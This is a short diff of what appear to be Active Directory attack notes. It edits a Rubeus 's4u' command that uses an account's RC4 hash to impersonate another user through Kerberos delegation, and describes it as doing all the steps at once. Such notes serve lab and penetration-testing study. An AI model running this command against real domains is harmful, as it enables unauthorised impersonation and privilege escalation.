@@ -732,7 +732,7 @@ klist
 
 NOW - we could just do it all in one RUBEUS command:
 
-```Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a```
+```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase```
 
 This would do all the steps for us!
 
